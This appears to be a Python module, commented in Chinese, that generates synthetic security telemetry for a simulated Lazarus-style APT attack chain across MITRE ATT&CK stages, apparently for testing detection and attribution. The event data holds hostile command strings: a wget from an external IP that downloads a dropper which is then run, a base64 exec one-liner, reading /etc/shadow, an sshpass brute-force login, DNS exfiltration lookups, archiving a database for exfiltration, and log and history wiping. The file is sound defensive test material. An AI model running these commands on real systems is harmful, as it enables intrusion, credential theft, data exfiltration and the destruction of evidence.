"""
场景一：APT攻击全链条检测与溯源
基于Lazarus Group攻击模式构造的完整APT攻击链
覆盖 MITRE ATT&CK 7个战术阶段
"""
from .scenario_base import AttackScenario


class APTFullChainScenario(AttackScenario):
    """APT全链条攻击场景"""

    def __init__(self):
        super().__init__(
            name="APT全链条攻击 (Lazarus Group模式)",
            description="模拟Lazarus Group风格的完整APT攻击链: 侦察→初始入侵→执行→持久化→"
                        "凭据窃取→横向移动→C2通信→数据外传。覆盖MITRE ATT&CK 10+技术。",
            scenario_type="apt_full_chain"
        )
        self.attacker_ip = "45.33.22.11"      # 外部C2
        self.dmz_web = "192.168.86.10"         # DMZ Web服务器
        self.linux_srv = "192.168.86.130"      # 内部Linux服务器
        self.windows_dc = "192.168.86.131"     # 域控制器
        self.jump_host = "192.168.86.132"      # 跳板机

    def generate_attack_sequence(self) -> list[dict]:
        stages = []

        # ============================
        # 阶段0: 侦察 (Reconnaissance)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段0: 侦察 (Reconnaissance)",
            "description": "攻击者对DMZ Web服务器进行端口扫描和漏洞探测",
            "events": [
                self._make_event("network_traffic", self.attacker_ip, "port_scan",
                    entities={"src_ip": self.attacker_ip, "dst_ip": self.dmz_web,
                              "scan_type": "SYN scan", "ports_scanned": [22, 80, 443, 8080, 8443]},
                    extra={"src_ip": self.attacker_ip, "dst_ip": self.dmz_web, "protocol": "TCP"}),
                self._make_event("network_traffic", self.attacker_ip, "port_scan",
                    entities={"src_ip": self.attacker_ip, "dst_ip": self.dmz_web,
                              "scan_type": "version_detect"},
                    extra={"src_ip": self.attacker_ip, "dst_ip": self.dmz_web, "protocol": "TCP"}),
                self._make_event("network_traffic", self.attacker_ip, "network_flow",
                    entities={"src_ip": self.attacker_ip, "dst_ip": self.dmz_web, "domain": "web01.dmz.local"},
                    extra={"src_ip": self.attacker_ip, "dst_ip": self.dmz_web, "dst_port": 443,
                           "protocol": "TCP", "packet_length": 1500}),
            ]
        })

        # ============================
        # 阶段1: 初始入侵 (Initial Access)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段1: 初始入侵 (Initial Access) - T1190/T1105",
            "description": "利用Web应用漏洞获取DMZ服务器初始访问权限，下载投放工具",
            "events": [
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "wget", "pid": 12345, "parent_pid": 12000,
                              "parent_process": "httpd", "command_line": "wget http://45.33.22.11/dropper.sh -O /tmp/dropper.sh"},
                    features={"is_abnormal_parent": True, "is_suspicious_cmd": True}),
                self._make_event("network_traffic", self.dmz_web, "network_flow",
                    entities={"src_ip": self.dmz_web, "dst_ip": self.attacker_ip, "domain": "c2-threat.external.com"},
                    extra={"src_ip": self.dmz_web, "dst_ip": self.attacker_ip, "dst_port": 80,
                           "protocol": "HTTP", "packet_length": 5000}),
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "chmod", "pid": 12346, "parent_pid": 12345,
                              "parent_process": "wget", "command_line": "chmod +x /tmp/dropper.sh"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "bash", "pid": 12347, "parent_pid": 12346,
                              "parent_process": "chmod",
                              "command_line": "/bin/bash /tmp/dropper.sh"},
                    features={"is_abnormal_parent": True}),
            ]
        })

        # ============================
        # 阶段2: 执行与持久化 (Execution & Persistence)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段2: 执行与持久化 (Execution & Persistence) - T1059/T1053/T1547",
            "description": "执行payload、建立持久化机制、Webshell部署",
            "events": [
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "python3", "pid": 12400, "parent_pid": 12347,
                              "parent_process": "bash",
                              "command_line": "python3 -c 'import base64;exec(base64.b64decode(\"...\"))'"},
                    features={"is_abnormal_parent": True, "is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.dmz_web, "file_create",
                    entities={"process_name": "python3", "pid": 12400,
                              "file_path": "/var/www/html/shell.php", "file_name": "shell.php",
                              "command_line": ""},
                    features={"is_suspicious_extension": True}),
                self._make_event("host_behavior", self.dmz_web, "file_modify",
                    entities={"process_name": "python3", "pid": 12400,
                              "file_path": "/etc/crontab", "file_name": "crontab",
                              "command_line": ""},
                    features={"is_cron_job_path": True}),
                self._make_event("host_behavior", self.dmz_web, "network_connection",
                    entities={"process_name": "python3", "pid": 12400,
                              "dst_ip": self.attacker_ip, "dst_port": 443,
                              "command_line": ""},
                    features={"is_outbound_c2": True}),
            ]
        })

        # ============================
        # 阶段3: 侦察发现 (Discovery)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段3: 内网侦察 (Discovery) - T1082/T1046",
            "description": "通过跳板机对内网进行侦察，扫描内网存活主机和服务",
            "events": [
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "whoami", "pid": 12500, "parent_pid": 12400,
                              "parent_process": "python3", "command_line": "whoami"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "ifconfig", "pid": 12501, "parent_pid": 12400,
                              "parent_process": "python3", "command_line": "ifconfig -a"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "netstat", "pid": 12502, "parent_pid": 12400,
                              "parent_process": "python3", "command_line": "netstat -antp"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("network_traffic", self.dmz_web, "port_scan",
                    entities={"src_ip": self.dmz_web, "dst_ip": "192.168.86.0/24",
                              "scan_type": "SYN scan"},
                    extra={"src_ip": self.dmz_web, "dst_ip": self.linux_srv, "dst_port": 22,
                           "protocol": "TCP"}),
            ]
        })

        # ============================
        # 阶段4: 凭据窃取 (Credential Access)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段4: 凭据窃取 (Credential Access) - T1003.008/T1110",
            "description": "读取敏感凭据文件并进行SSH暴力破解",
            "events": [
                self._make_event("host_behavior", self.dmz_web, "file_read",
                    entities={"process_name": "cat", "pid": 12600, "parent_pid": 12400,
                              "parent_process": "python3", "file_path": "/etc/shadow",
                              "file_name": "shadow",
                              "command_line": "cat /etc/shadow"},
                    features={"is_sensitive_path": True}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_log", self.linux_srv, "user_logon_failed",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "failure_reason": "bad_password"}),
                self._make_event("host_behavior", self.dmz_web, "process_create",
                    entities={"process_name": "sshpass", "pid": 12650, "parent_pid": 12400,
                              "parent_process": "python3",
                              "command_line": "sshpass -p 'password123' ssh root@192.168.86.130"},
                    features={"is_suspicious_cmd": True}),
            ]
        })

        # ============================
        # 阶段5: 横向移动 (Lateral Movement)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段5: 横向移动 (Lateral Movement) - T1021.004/T1047",
            "description": "SSH登录核心服务器，利用WMI攻击Windows域控",
            "events": [
                self._make_event("host_log", self.linux_srv, "user_logon",
                    entities={"user": "root", "src_ip": self.dmz_web,
                              "session_id": "ssh-001"}),
                self._make_event("host_behavior", self.linux_srv, "process_create",
                    entities={"process_name": "bash", "pid": 13000, "parent_pid": 1,
                              "parent_process": "sshd",
                              "command_line": "-bash (SSH session from 192.168.86.10)"},
                    features={"is_abnormal_parent": False}),
                self._make_event("host_behavior", self.linux_srv, "process_create",
                    entities={"process_name": "python3", "pid": 13010, "parent_pid": 13000,
                              "parent_process": "bash",
                              "command_line": "python3 wmi_exploit.py --target 192.168.86.131"},
                    features={"is_abnormal_parent": False, "is_suspicious_cmd": True}),
                self._make_event("network_traffic", self.linux_srv, "network_flow",
                    entities={"src_ip": self.linux_srv, "dst_ip": self.windows_dc},
                    extra={"src_ip": self.linux_srv, "dst_ip": self.windows_dc, "dst_port": 135,
                           "protocol": "TCP", "packet_length": 800}),
                self._make_event("host_behavior", self.windows_dc, "process_create",
                    entities={"process_name": "WmiPrvSE.exe", "pid": 5000, "parent_pid": 500,
                              "parent_process": "svchost.exe",
                              "command_line": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe"},
                    features={"is_abnormal_parent": False}),
                self._make_event("host_behavior", self.windows_dc, "process_create",
                    entities={"process_name": "cmd.exe", "pid": 5001, "parent_pid": 5000,
                              "parent_process": "WmiPrvSE.exe",
                              "command_line": "cmd.exe /c nslookup exfil-data.lazarus-c2.net"},
                    features={"is_abnormal_parent": True}),
            ]
        })

        # ============================
        # 阶段6: C2通信与隐蔽信道 (Command and Control)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段6: C2通信 (Command and Control) - T1071.004/T1095",
            "description": "建立DNS隧道和ICMP隧道进行隐蔽C2通信",
            "events": [
                self._make_event("network_traffic", self.windows_dc, "dns_tunnel_suspected",
                    entities={"src_ip": self.windows_dc, "dst_ip": self.attacker_ip,
                              "domain": "dGhpcyBpcyBhIHRlc3QgbWVzc2FnZSBmb3IgZXhmaWx0cmF0aW9u.lazarus-c2.net",
                              "query_type": "TXT"},
                    features={"is_covert_channel": True, "channel_type": "DNS Tunneling",
                              "dns_query_length": 85, "entropy": 4.8}),
                self._make_event("network_traffic", self.windows_dc, "dns_tunnel_suspected",
                    entities={"src_ip": self.windows_dc, "dst_ip": self.attacker_ip,
                              "domain": "c2NhbkFQVCBpbmZyYXN0cnVjdHVyZSBkZXRlY3RlZA.lazarus-c2.net",
                              "query_type": "MX"},
                    features={"is_covert_channel": True, "channel_type": "DNS Tunneling",
                              "dns_query_length": 72, "entropy": 4.6}),
                self._make_event("network_traffic", self.windows_dc, "icmp_tunnel_suspected",
                    entities={"src_ip": self.windows_dc, "dst_ip": self.attacker_ip},
                    extra={"src_ip": self.windows_dc, "dst_ip": self.attacker_ip,
                           "protocol": "ICMP", "packet_length": 1200,
                           "event_type": "icmp_tunnel_suspected"}),
                self._make_event("network_traffic", self.windows_dc, "icmp_tunnel_suspected",
                    entities={"src_ip": self.windows_dc, "dst_ip": self.attacker_ip},
                    extra={"src_ip": self.windows_dc, "dst_ip": self.attacker_ip,
                           "protocol": "ICMP", "packet_length": 1500,
                           "event_type": "icmp_tunnel_suspected"}),
            ]
        })

        # ============================
        # 阶段7: 数据外传 (Exfiltration)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段7: 数据外传 (Exfiltration) - T1041/T1048",
            "description": "收集敏感数据并通过C2通道外传到攻击者服务器",
            "events": [
                self._make_event("host_behavior", self.linux_srv, "file_read",
                    entities={"process_name": "tar", "pid": 14000, "parent_pid": 13010,
                              "parent_process": "python3",
                              "file_path": "/var/lib/postgresql/data",
                              "file_name": "pg_data.tar.gz",
                              "command_line": "tar -czf /tmp/data.tar.gz /var/lib/postgresql/data"},
                    features={"is_sensitive_path": True}),
                self._make_event("network_traffic", self.linux_srv, "data_exfiltration",
                    entities={"src_ip": self.linux_srv, "dst_ip": self.attacker_ip,
                              "file_name": "data.tar.gz", "file_size": 52428800},
                    extra={"src_ip": self.linux_srv, "dst_ip": self.attacker_ip, "dst_port": 443,
                           "protocol": "HTTPS", "packet_length": 65000,
                           "event_type": "data_exfiltration"}),
                self._make_event("network_traffic", self.linux_srv, "data_exfiltration",
                    entities={"src_ip": self.linux_srv, "dst_ip": self.attacker_ip,
                              "file_name": "data.tar.gz", "file_size": 31457280},
                    extra={"src_ip": self.linux_srv, "dst_ip": self.attacker_ip, "dst_port": 443,
                           "protocol": "HTTPS", "packet_length": 65000,
                           "event_type": "data_exfiltration"}),
            ]
        })

        # ============================
        # 阶段8: 痕迹清除 (Defense Evasion)
        # ============================
        stages.append({
            "type": "stage",
            "name": "阶段8: 痕迹清除 (Defense Evasion) - T1070",
            "description": "清除日志和攻击痕迹，掩盖入侵路径",
            "events": [
                self._make_event("host_log", self.linux_srv, "log_clear",
                    entities={"user": "root", "log_type": "syslog"}),
                self._make_event("host_behavior", self.linux_srv, "process_create",
                    entities={"process_name": "rm", "pid": 15000, "parent_pid": 13010,
                              "parent_process": "python3",
                              "command_line": "rm -rf /tmp/data.tar.gz /tmp/dropper.sh /var/log/auth.log"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.linux_srv, "process_create",
                    entities={"process_name": "history", "pid": 15001, "parent_pid": 13010,
                              "parent_process": "python3",
                              "command_line": "history -c && unset HISTFILE"},
                    features={"is_suspicious_cmd": True}),
            ]
        })

        return stages
